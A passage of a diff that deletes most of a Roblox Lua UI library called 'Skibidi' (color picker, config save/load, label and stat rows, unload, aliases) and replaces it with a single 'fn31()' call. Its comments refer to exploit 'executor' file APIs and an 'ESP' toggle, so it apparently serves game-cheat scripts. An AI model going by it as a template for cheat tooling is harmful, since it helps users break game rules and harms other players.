---
---   Icon       string   Lucide icon before the label (optional)
--- Returns: { Frame, SetOpen(bool), SetValue(color3), GetValue() }
--- ============================================================
-function Skibidi.CreateColorPicker(Parent, Options)
-	Options = Options or {}
-	local current = Options.Default or Color3.fromRGB(255, 255, 255)
-	local h, s, v = Color3.toHSV(current)
-
-	local Card = Instance.new("Frame")
-	Card.Size              = UDim2.new(1, 0, 0, 0)
-	Card.AutomaticSize     = Enum.AutomaticSize.Y
-	Card.BackgroundColor3  = Theme.Bg2
-	Card.BorderSizePixel   = 0
-	Card.ClipsDescendants  = true
-	Card.Parent            = Parent
-	MakeCorner(Card, UDim.new(0, Theme.CornerRadiusSmall))
-	MakeEdge(Card, Theme.AccentDim, 1)
-	MakeGloss(Card, 0.10)
-	local CardLayout = Instance.new("UIListLayout", Card)
-	CardLayout.SortOrder = Enum.SortOrder.LayoutOrder
-	CardLayout.Padding   = UDim.new(0, 0)
-
-	local Head = Instance.new("TextButton", Card)
-	Head.Size                   = UDim2.new(1, 0, 0, 34)
-	Head.LayoutOrder            = 0
-	Head.BackgroundTransparency = 1
-	Head.AutoButtonColor        = false
-	Head.Text                   = ""
-	MakeHoverFill(Head, 3, 5)
-
-	local Lbl = Instance.new("TextLabel", Head)
-	Lbl.Size                   = UDim2.new(1, -60, 1, 0)
-	Lbl.Position               = UDim2.new(0, 12, 0, 0)
-	Lbl.BackgroundTransparency = 1
-	Lbl.Font                   = Theme.FontRegular
-	Lbl.TextSize               = Theme.BodySize
-	Lbl.TextColor3             = Theme.TextPrimary
-	Lbl.TextXAlignment         = Enum.TextXAlignment.Left
-	Lbl.Text                   = Options.Label or ""
-	if Options.Icon then PrefixIcon(Lbl, Options.Icon, 14, Theme.TextPrimary) end
-
-	local Swatch = Instance.new("Frame", Head)
-	Swatch.AnchorPoint      = Vector2.new(1, 0.5)
-	Swatch.Position         = UDim2.new(1, -10, 0.5, 0)
-	Swatch.Size             = UDim2.new(0, 36, 0, 20)
-	Swatch.BackgroundColor3 = current
-	Swatch.BorderSizePixel  = 0
-	MakeCorner(Swatch, UDim.new(0, 6))
-	MakeEdge(Swatch, Theme.AccentDim, 1)
-	-- The swatch blooms in whatever colour it is currently showing, which
-	-- doubles as a preview of that colour against the panel surface.
-	local SwatchGlow = MakeInnerGlow(Swatch, current, 9, 0.55)
-
-	local Panel = Instance.new("Frame", Card)
-	Panel.Size                   = UDim2.new(1, 0, 0, 0)
-	Panel.AutomaticSize          = Enum.AutomaticSize.Y
-	Panel.LayoutOrder            = 1
-	Panel.BackgroundTransparency = 1
-	Panel.Visible                = false
-	MakePadding(Panel, 10, 10, 4, 10)
-	MakeListLayout(Panel, Enum.FillDirection.Vertical, 8)
-
-	local SVBox = Instance.new("Frame", Panel)
-	SVBox.Size              = UDim2.new(1, 0, 0, 90)
-	SVBox.LayoutOrder        = 0
-	SVBox.BackgroundColor3  = Color3.fromHSV(h, 1, 1)
-	SVBox.BorderSizePixel   = 0
-	SVBox.ClipsDescendants  = true
-	MakeCorner(SVBox, UDim.new(0, 6))
-	MakeStroke(SVBox, Theme.AccentDim, 1).Transparency = 0.4
-
-	local SatOverlay = Instance.new("Frame", SVBox)
-	SatOverlay.Size             = UDim2.new(1, 0, 1, 0)
-	SatOverlay.BackgroundColor3 = Color3.new(1, 1, 1)
-	SatOverlay.BorderSizePixel  = 0
-	local satGrad = Instance.new("UIGradient", SatOverlay)
-	satGrad.Transparency = NumberSequence.new({
-		NumberSequenceKeypoint.new(0, 0),
-		NumberSequenceKeypoint.new(1, 1),
-	})
-
-	local ValOverlay = Instance.new("Frame", SVBox)
-	ValOverlay.Size             = UDim2.new(1, 0, 1, 0)
-	ValOverlay.BackgroundColor3 = Color3.new(0, 0, 0)
-	ValOverlay.BorderSizePixel  = 0
-	local valGrad = Instance.new("UIGradient", ValOverlay)
-	valGrad.Rotation = 90
-	valGrad.Transparency = NumberSequence.new({
-		NumberSequenceKeypoint.new(0, 1),
-		NumberSequenceKeypoint.new(1, 0),
-	})
-
-	local SVCursor = Instance.new("Frame", SVBox)
-	SVCursor.Size             = UDim2.new(0, 10, 0, 10)
-	SVCursor.AnchorPoint      = Vector2.new(0.5, 0.5)
-	SVCursor.BackgroundColor3 = Color3.new(1, 1, 1)
-	SVCursor.BorderSizePixel  = 0
-	SVCursor.ZIndex           = 2
-	MakeCorner(SVCursor, UDim.new(1, 0))
-	MakeStroke(SVCursor, Color3.new(0, 0, 0), 1.5)
-
-	local HueTrack = Instance.new("Frame", Panel)
-	HueTrack.Size            = UDim2.new(1, 0, 0, 14)
-	HueTrack.LayoutOrder     = 1
-	HueTrack.BorderSizePixel = 0
-	MakeCorner(HueTrack, UDim.new(1, 0))
-	local hueGrad = Instance.new("UIGradient", HueTrack)
-	hueGrad.Color = ColorSequence.new({
-		ColorSequenceKeypoint.new(0.000, Color3.fromHSV(0 / 6, 1, 1)),
-		ColorSequenceKeypoint.new(0.166, Color3.fromHSV(1 / 6, 1, 1)),
-		ColorSequenceKeypoint.new(0.333, Color3.fromHSV(2 / 6, 1, 1)),
-		ColorSequenceKeypoint.new(0.500, Color3.fromHSV(3 / 6, 1, 1)),
-		ColorSequenceKeypoint.new(0.666, Color3.fromHSV(4 / 6, 1, 1)),
-		ColorSequenceKeypoint.new(0.833, Color3.fromHSV(5 / 6, 1, 1)),
-		ColorSequenceKeypoint.new(1.000, Color3.fromHSV(6 / 6, 1, 1)),
-	})
-
-	local HueCursor = Instance.new("Frame", HueTrack)
-	HueCursor.Size             = UDim2.new(0, 4, 1, 4)
-	HueCursor.AnchorPoint      = Vector2.new(0.5, 0.5)
-	HueCursor.Position         = UDim2.new(h, 0, 0.5, 0)
-	HueCursor.BackgroundColor3 = Color3.new(1, 1, 1)
-	HueCursor.BorderSizePixel  = 0
-	MakeCorner(HueCursor, UDim.new(0, 2))
-	MakeStroke(HueCursor, Color3.new(0, 0, 0), 1)
-
-	local HexBox = Instance.new("TextBox", Panel)
-	HexBox.Size              = UDim2.new(1, 0, 0, 24)
-	HexBox.LayoutOrder       = 2
-	HexBox.BackgroundColor3  = Theme.InputBg
-	HexBox.BorderSizePixel   = 0
-	HexBox.Font              = Theme.FontMedium
-	HexBox.TextSize          = Theme.SmallSize
-	HexBox.TextColor3        = Theme.AccentSec
-	HexBox.ClearTextOnFocus  = false
-	MakeCorner(HexBox, UDim.new(0, 5))
-	local hexStroke = MakeEdge(HexBox, Theme.AccentDim, 1)
-	MakeGloss(HexBox, 0.10)
-
-	HexBox.Focused:Connect(function()
-		TweenService:Create(hexStroke, TweenFast, { Color = Theme.Accent, Thickness = 1.5 }):Play()
-	end)
-
-	local function updateFromHSV(fireEvent)
-		current = Color3.fromHSV(h, s, v)
-		Swatch.BackgroundColor3 = current
-		if SwatchGlow then SwatchGlow.SetColor(current) end
-		SVBox.BackgroundColor3  = Color3.fromHSV(h, 1, 1)
-		SVCursor.Position       = UDim2.new(s, 0, 1 - v, 0)
-		HueCursor.Position      = UDim2.new(h, 0, 0.5, 0)
-		HexBox.Text             = string.format("#%02X%02X%02X",
-			math.floor(current.R * 255 + 0.5),
-			math.floor(current.G * 255 + 0.5),
-			math.floor(current.B * 255 + 0.5))
-		if fireEvent and Options.OnChanged then Options.OnChanged(current) end
-	end
-	updateFromHSV(false)
-
-	local draggingSV, draggingHue = false, false
-
-	local function jumpSV(pos)
-		local rel = Vector2.new(
-			(pos.X - SVBox.AbsolutePosition.X) / SVBox.AbsoluteSize.X,
-			(pos.Y - SVBox.AbsolutePosition.Y) / SVBox.AbsoluteSize.Y)
-		s = math.clamp(rel.X, 0, 1)
-		v = 1 - math.clamp(rel.Y, 0, 1)
-		updateFromHSV(true)
-	end
-	local function jumpHue(pos)
-		local rel = (pos.X - HueTrack.AbsolutePosition.X) / HueTrack.AbsoluteSize.X
-		h = math.clamp(rel, 0, 1)
-		updateFromHSV(true)
-	end
-
-	SVBox.InputBegan:Connect(function(inp)
-		if inp.UserInputType == Enum.UserInputType.MouseButton1 or inp.UserInputType == Enum.UserInputType.Touch then
-			draggingSV = true
-			jumpSV(inp.Position)
-		end
-	end)
-	HueTrack.InputBegan:Connect(function(inp)
-		if inp.UserInputType == Enum.UserInputType.MouseButton1 or inp.UserInputType == Enum.UserInputType.Touch then
-			draggingHue = true
-			jumpHue(inp.Position)
-		end
-	end)
-	ConnectScoped(Card, UserInputService.InputEnded, function(inp)
-		if inp.UserInputType == Enum.UserInputType.MouseButton1 or inp.UserInputType == Enum.UserInputType.Touch then
-			draggingSV, draggingHue = false, false
-		end
-	end)
-	ConnectScoped(Card, UserInputService.InputChanged, function(inp)
-		if inp.UserInputType ~= Enum.UserInputType.MouseMovement and inp.UserInputType ~= Enum.UserInputType.Touch then return end
-		if draggingSV then jumpSV(inp.Position)
-		elseif draggingHue then jumpHue(inp.Position) end
-	end)
-
-	HexBox.FocusLost:Connect(function()
-		TweenService:Create(hexStroke, TweenFast, { Color = EdgeRest(), Thickness = 1 }):Play()
-		local hex = string.gsub(HexBox.Text, "#", "")
-		if #hex == 6 and string.match(hex, "^%x+$") then
-			local r = tonumber(string.sub(hex, 1, 2), 16) / 255
-			local g = tonumber(string.sub(hex, 3, 4), 16) / 255
-			local b = tonumber(string.sub(hex, 5, 6), 16) / 255
-			h, s, v = Color3.toHSV(Color3.new(r, g, b))
-			updateFromHSV(true)
-		else
-			updateFromHSV(false)
-		end
-	end)
-
-	local isOpen = false
-	local function setOpen(open)
-		isOpen = open
-		Panel.Visible = open
-		if open then
-			OverlayOpened(Card, function() setOpen(false) end)
-		else
-			OverlayClosed(Card)
-		end
-	end
-	Card.Destroying:Connect(function() OverlayClosed(Card) end)
-
-	Head.MouseButton1Click:Connect(function()
-		setOpen(not isOpen)
-	end)
-	AttachTooltip(Head, Options.Tooltip)
-
-	if Options.Flag then
-		Flags[Options.Flag] = {
-			Kind = "color",
-			Get  = function() return current end,
-			Set  = function(c)
-				if typeof(c) == "Color3" then
-					h, s, v = Color3.toHSV(c)
-					updateFromHSV(true)
-				end
-			end,
-		}
-	end
-
-	return {
-		Frame    = Card,
-		SetOpen  = setOpen,
-		SetValue = function(c)
-			h, s, v = Color3.toHSV(c)
-			updateFromHSV(false)
-		end,
-		GetValue = function() return current end,
-	}
-end
-
--- ============================================================
--- Init
--- Optional bootstrap call. Lets you override theme values and
--- set a default Parent for future CreatePanel calls in one go,
--- without having to reach into Skibidi.Theme directly.
---
--- Options:
---   Theme    table      Partial theme override, merged into Skibidi.Theme
---   Parent   Instance   Default parent for new panels (default PlayerGui)
---
--- Returns: Skibidi (so calls can be chained, e.g.
---   Skibidi.Init({ Theme = { Accent = Color3.fromRGB(120,80,220) } }).CreatePanel({...})
--- ============================================================
-function Skibidi.Init(Options)
-	Options = Options or {}
-	if Options.Theme then
-		for k, val in pairs(Options.Theme) do
-			Theme[k] = val
-		end
-	end
-	if Options.Parent then
-		DefaultParent = Options.Parent
-	end
-	return Skibidi
-end
-
--- ============================================================
--- SaveConfig / LoadConfig
--- Optional persistence for component values, backed by the
--- executor's writefile/readfile. Both are safe no-ops (returning
--- false + a reason) when the executor doesn't support file APIs,
--- so scripts that never call them — or run without file access —
--- are completely unaffected.
---
--- To opt a component in, give it a Flag key at creation:
---   Skibidi.CreateToggle(tab, { Label = "ESP", Flag = "esp", ... })
--- Supported: Toggle (bool), Slider (number), TextInput (string),
--- Dropdown (string / array if Multi), Keybind (key name string),
--- ColorPicker (RGB table), Group (index), InputList (array).
---
---   Skibidi.SaveConfig(name)  → true  |  false, err
---   Skibidi.LoadConfig(name)  → true  |  false, err
---
--- `name` defaults to "UILibConfig"; files are stored as
--- "<name>.json" in the executor's workspace folder. Loading
--- applies each saved value through the component's setter and
--- fires its OnChanged/OnSubmit so consuming scripts stay in sync.
--- ============================================================
-local function configFileName(name)
-	return tostring(name or "UILibConfig") .. ".json"
-end
-
-function Skibidi.SaveConfig(name)
-	if type(writefile) ~= "function" then
-		return false, "writefile is not supported by this executor"
-	end
-	local data = {}
-	for flag, entry in pairs(Flags) do
-		local ok, v = pcall(entry.Get)
-		if ok and v ~= nil then
-			if entry.Kind == "color" then
-				v = {
-					R = math.floor(v.R * 255 + 0.5),
-					G = math.floor(v.G * 255 + 0.5),
-					B = math.floor(v.B * 255 + 0.5),
-				}
-			end
-			data[flag] = v
-		end
-	end
-	local okEncode, json = pcall(HttpService.JSONEncode, HttpService, data)
-	if not okEncode then return false, json end
-	local okWrite, err = pcall(writefile, configFileName(name), json)
-	if not okWrite then return false, err end
-	return true
-end
-
-function Skibidi.LoadConfig(name)
-	if type(readfile) ~= "function" then
-		return false, "readfile is not supported by this executor"
-	end
-	local file = configFileName(name)
-	if type(isfile) == "function" and not isfile(file) then
-		return false, "no such config: " .. file
-	end
-	local okRead, json = pcall(readfile, file)
-	if not okRead then return false, json end
-	local okDecode, data = pcall(HttpService.JSONDecode, HttpService, json)
-	if not okDecode or type(data) ~= "table" then
-		return false, "invalid config file: " .. file
-	end
-	for flag, v in pairs(data) do
-		local entry = Flags[flag]
-		if entry then
-			if entry.Kind == "color" and type(v) == "table" then
-				v = Color3.fromRGB(v.R or 255, v.G or 255, v.B or 255)
-			end
-			pcall(entry.Set, v)
-		end
-	end
-	return true
-end
-
--- ============================================================
--- CreateLabel
--- A lightweight single-line text row — for captions, hints and
--- section lead-ins that don't need a full Paragraph card.
---
--- Options:
---   Text       string
---   Color      Color3                    (default Theme.TextMuted)
---   TextSize   number                    (default Theme.SmallSize)
---   Font       Enum.Font                 (default Theme.FontRegular)
---   Alignment  Enum.TextXAlignment       (default Left)
---   Height     number                    (default 18)
---   Icon       string   Lucide icon before the text (optional)
---
--- Returns: { Frame, Label, SetText(text) }
--- ============================================================
-function Skibidi.CreateLabel(Parent, Options)
-	Options = Options or {}
-
-	local Lbl = Instance.new("TextLabel")
-	Lbl.Size                   = UDim2.new(1, 0, 0, Options.Height or 18)
-	Lbl.BackgroundTransparency = 1
-	Lbl.BorderSizePixel        = 0
-	Lbl.Font                   = Options.Font or Theme.FontRegular
-	Lbl.TextSize               = Options.TextSize or Theme.SmallSize
-	Lbl.TextColor3             = Options.Color or Theme.TextMuted
-	Lbl.TextXAlignment         = Options.Alignment or Enum.TextXAlignment.Left
-	Lbl.TextTruncate           = Enum.TextTruncate.AtEnd
-	Lbl.Text                   = Options.Text or ""
-	Lbl.Parent                 = Parent
-	if Options.Icon then PadIcon(Lbl, Options.Icon, 14, Lbl.TextColor3) end
-
-	return {
-		Frame   = Lbl,
-		Label   = Lbl,
-		SetText = function(t) Lbl.Text = t or "" end,
-	}
-end
-
--- ============================================================
--- CreateKeyValue
--- A compact stat row: muted key on the left, highlighted value
--- on the right. Ideal for live status readouts.
---
--- Options:
---   Label      string
---   Value      string | number   Initial value (default "-")
---   Tooltip    string            Hover tooltip (optional)
---
---   Icon       string   Lucide icon before the label (optional)
--- Returns: { Frame, SetValue(v), SetLabel(t), GetValue() }
--- ============================================================
-function Skibidi.CreateKeyValue(Parent, Options)
-	Options = Options or {}
-	local value = Options.Value ~= nil and tostring(Options.Value) or "-"
-
-	local Row = Instance.new("Frame")
-	Row.Size             = UDim2.new(1, 0, 0, 26)
-	Row.BackgroundColor3 = Theme.Bg2
-	Row.BorderSizePixel  = 0
-	Row.Parent           = Parent
-	MakeCorner(Row, UDim.new(0, Theme.CornerRadiusXs))
-	MakeEdge(Row, Theme.AccentDim, 1)
-	MakeGloss(Row, 0.10)
-
-	local KeyLbl = Instance.new("TextLabel", Row)
-	KeyLbl.Size                   = UDim2.new(0.5, -18, 1, 0)
-	KeyLbl.Position               = UDim2.new(0, 16, 0, 0)
-	KeyLbl.BackgroundTransparency = 1
-	KeyLbl.Font                   = Theme.FontRegular
-	KeyLbl.TextSize               = Theme.SmallSize
-	KeyLbl.TextColor3             = Theme.TextMuted
-	KeyLbl.TextXAlignment         = Enum.TextXAlignment.Left
-	KeyLbl.TextTruncate           = Enum.TextTruncate.AtEnd
-	KeyLbl.Text                   = Options.Label or ""
-	if Options.Icon then PrefixIcon(KeyLbl, Options.Icon, 14, Theme.TextMuted) end
-
-	local ValLbl = Instance.new("TextLabel", Row)
-	ValLbl.Size                   = UDim2.new(0.5, -14, 1, 0)
-	ValLbl.Position               = UDim2.new(0.5, 2, 0, 0)
-	ValLbl.BackgroundTransparency = 1
-	ValLbl.Font                   = Theme.FontMedium
-	ValLbl.TextSize               = Theme.SmallSize
-	ValLbl.TextColor3             = Theme.AccentSec
-	ValLbl.TextXAlignment         = Enum.TextXAlignment.Right
-	ValLbl.TextTruncate           = Enum.TextTruncate.AtEnd
-	ValLbl.Text                   = value
-
-	-- A stat row is read in bulk, so it gets a marker rather than a
-	-- border: the eye can run down a column of ticks far faster than it
-	-- can pick labels out of a stack of identical boxes.
-	local Tick = Instance.new("Frame", Row)
-	Tick.AnchorPoint      = Vector2.new(0, 0.5)
-	Tick.Size             = UDim2.new(0, 2, 0, 10)
-	Tick.Position         = UDim2.new(0, 7, 0.5, 0)
-	Tick.BackgroundColor3 = Theme.Accent
-	Tick.BackgroundTransparency = 0.35
-	Tick.BorderSizePixel  = 0
-	MakeCorner(Tick, UDim.new(1, 0))
-
-	Row.MouseEnter:Connect(function()
-		TweenService:Create(Row,  TweenFast, { BackgroundColor3 = Theme.Hover }):Play()
-		TweenService:Create(Tick, TweenSpring,
-			{ Size = UDim2.new(0, 2, 0, 16), BackgroundTransparency = 0 }):Play()
-	end)
-	Row.MouseLeave:Connect(function()
-		TweenService:Create(Row,  TweenFast, { BackgroundColor3 = Theme.Bg2 }):Play()
-		TweenService:Create(Tick, TweenFast,
-			{ Size = UDim2.new(0, 2, 0, 10), BackgroundTransparency = 0.35 }):Play()
-	end)
-
-	AttachTooltip(Row, Options.Tooltip)
-	PlayEntrance(Row)
-
-	return {
-		Frame    = Row,
-		SetValue = function(v)
-			value = tostring(v)
-			ValLbl.Text = value
-			-- A value that just changed should say so; the flash decays
-			-- back to the resting colour on its own.
-			ValLbl.TextColor3 = Lighten(Theme.AccentSec, 0.2)
-			TweenService:Create(ValLbl, TweenSoft,
-				{ TextColor3 = Theme.AccentSec }):Play()
-		end,
-		SetLabel = function(t) KeyLbl.Text = t or "" end,
-		GetValue = function() return value end,
-	}
-end
-
--- ============================================================
--- Unload
--- Destroys every panel, notification and tooltip the library has
--- created and clears internal state. Safe to call multiple times.
--- ============================================================
-function Skibidi.Unload()
-	for _, g in ipairs(_allGuis) do
-		if g and g.Parent then g:Destroy() end
-	end
-	_allGuis = {}
-	if _notifSg then _notifSg:Destroy(); _notifSg = nil end
-	_notifList = {}
-	if _tooltipSg then _tooltipSg:Destroy(); _tooltipSg = nil end
-	_tooltipFrame, _tooltipLbl = nil, nil
-	if _overlayWatch then _overlayWatch:Disconnect(); _overlayWatch = nil end
-	_openOverlay = nil
-	for k in pairs(Flags) do Flags[k] = nil end
-end
-
--- ============================================================
--- Convenience lowercase aliases
--- Exposes each component under a short name in addition to the
--- primary CreateXxx API, without altering how the components
--- themselves are implemented.
--- ============================================================
-Skibidi.init        = Skibidi.Init
-Skibidi.unload      = Skibidi.Unload
-Skibidi.saveconfig  = Skibidi.SaveConfig
-Skibidi.loadconfig  = Skibidi.LoadConfig
-Skibidi.notify      = Skibidi.ShowNotification
-Skibidi.label       = Skibidi.CreateLabel
-Skibidi.keyvalue    = Skibidi.CreateKeyValue
-Skibidi.button      = Skibidi.CreateButton
-Skibidi.code        = Skibidi.CreateCode
-Skibidi.colorpicker = Skibidi.CreateColorPicker
-Skibidi.divider     = Skibidi.CreateDivider
-Skibidi.dropdown    = Skibidi.CreateDropdown
-Skibidi.group       = Skibidi.CreateGroup
-Skibidi.hstack      = Skibidi.CreateHStack
-Skibidi.image       = Skibidi.CreateImage
-Skibidi.input       = Skibidi.CreateTextInput
-Skibidi.keybind     = Skibidi.CreateKeybind
-Skibidi.paragraph   = Skibidi.CreateParagraph
-Skibidi.progressbar = Skibidi.CreateProgressBar
-Skibidi.section     = Skibidi.CreateSection
-Skibidi.slider      = Skibidi.CreateSlider
-Skibidi.space       = Skibidi.CreateSpace
-Skibidi.toggle      = Skibidi.CreateToggle
-Skibidi.vstack      = Skibidi.CreateVStack
-Skibidi.video       = Skibidi.CreateVideo
-Skibidi.viewport    = Skibidi.CreateViewport
-
-return Skibidi
+fn31()
